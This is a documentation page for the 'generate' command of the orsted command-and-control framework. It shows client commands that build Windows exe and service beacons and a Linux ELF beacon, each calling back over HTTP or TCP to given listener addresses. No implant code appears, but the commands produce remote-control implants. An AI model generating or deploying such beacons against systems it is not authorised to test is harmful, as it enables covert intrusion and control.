---
title: generate
description: orsted c2 generate
---

### General

The `generate` command is only available from the main menu of the orsted client.

It allows to generate beacons.

```
orsted-client » generate --help

generate beacon or implant from a given beacon

Usage:
  generate [flags]

Flags:
  -h, --help     display help

Sub Commands:
  beacon  generate beacon (HTTP, HTTPS, TCP)
```

Listeners only support HTTP or HTTPS, TCP in the latest orsted version. Other protocol support may come soon.

### Generate a Windows beacon

Here the `tab` of the keyboard will guide you.

For example, to generate a `orsted-beacon` that:
- is a windows `exe`
- talk `http`
- connect to `192.168.122.45:80`

You can use

```bash
orsted-client » generate beacon windows http 192.168.122.45:80
```

`main_http.exe` will be generated.

For windows, you can generate a dll or a service for each protocol of communication type.

For example, to generate a `orsted-beacon` that:
- is a windows `service`
- talk `tcp`
- connect to `127.0.0.1:4444`

You can use

```bash
orsted-client » generate beacon windows tcp_svc 127.0.0.1:4444
```

`main_tcp_svc.exe` will be generated.


### Generate a Linux beacon

Here the `tab` of the keyboard will guide you.

For example, to generate a `orsted-beacon` that:
- is a Linux `elf`
- talk `http`
- connect to `192.168.122.45:80`

You can use

```bash
orsted-client » generate beacon linux http 192.168.122.45:80
```

`main_http` will be generated.
